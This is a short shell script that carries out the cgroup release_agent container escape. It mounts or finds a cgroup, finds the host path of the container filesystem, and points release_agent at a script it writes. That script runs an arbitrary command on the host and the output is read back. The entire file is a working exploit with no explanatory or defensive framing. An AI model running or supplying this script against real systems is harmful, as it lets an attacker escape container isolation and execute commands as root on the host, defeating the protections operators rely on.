#!/bin/sh
dir=`dirname $(ls -x /sys/fs/cgroup/*/release_agent |head -n1)`
if [ $? -eq 1 ]; then
  echo "No cgroups with a release_agent found. Exiting."
  exit 1
fi

# Needs --privileged container
mkdir -p $dir/w
if [ $? -eq 1 ]; then
  # Container likely not privileged and fs is read-only, try ToB approach
  echo "Read-only file system maybe? Let's mount a writable one."
  dir="/tmp/cgrp"
  mkdir -p $dir && \
  mount -t cgroup -o rdma cgroup $dir
  mkdir -p $dir/w
  # Maybe the directory exists?
  if [ $? -eq 1 ]; then
    echo "Still no luck, exiting"
    exit 1
  fi
fi

# Enable release notifications
echo 1 > $dir/w/notify_on_release
# Find the mount point of / on the host
mntpnt=`sed -n 's/.*\upperdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /out
# Set our script as the release_agent
echo $mntpnt/pwn.sh > $dir/release_agent
# Create the script
echo "#!/bin/sh
$1 > $mntpnt/out" >/pwn.sh
chmod +x /pwn.sh

# Add the writing process to the cgroup. The process will exit immediately
# after it empties the group and will trigger the release_agent
sh -c "echo 0 > $dir/w/cgroup.procs"
sleep 1
cat /out
rmdir $dir/w
